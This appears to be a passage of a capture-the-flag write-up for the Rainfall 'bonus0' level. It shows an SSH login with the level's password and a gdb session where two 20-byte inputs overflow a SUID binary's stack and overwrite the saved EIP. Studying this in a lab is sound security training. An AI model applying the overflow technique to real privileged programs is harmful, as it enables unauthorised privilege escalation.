Login as `bonus0`.
```shell
┌──$ [~/42/2021/rainfall/level9]
└─>  ssh 192.168.0.39 -p 4242 -l bonus0
bonus0@192.168.0.39's password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
A `SUID` executable is located in the home directory.
```shell
bonus0@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
```
Program segfaults when receive input of 20 A's.
```gdb
bonus0@RainFall:~$ gdb ./bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAA
 -
AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�� AAAAAAAAAAAAAAAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```


```gdb
(gdb) b *0x080485cb
Breakpoint 2 at 0x80485cb
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAA
 -
AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�� AAAAAAAAAAAAAAAAAAAA��
Dump of assembler code for function main:
   [...]
=> 0x080485cb <+39>:	ret
End of assembler dump.
eip            0x80485cb	0x80485cb <main+39>

Breakpoint 2, 0x080485cb in main ()
(gdb) info frame
Stack level 0, frame at 0xbffff740:
 eip = 0x80485cb in main; saved eip 0x41414141
 Arglist at 0x41414141, args:
 Locals at 0x41414141, Previous frame's sp is 0xbffff740
 Saved registers:
  eip at 0xbffff73c
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
Error while running hook_stop:
No function contains program counter for selected frame.
0x41414141 in ?? ()
```
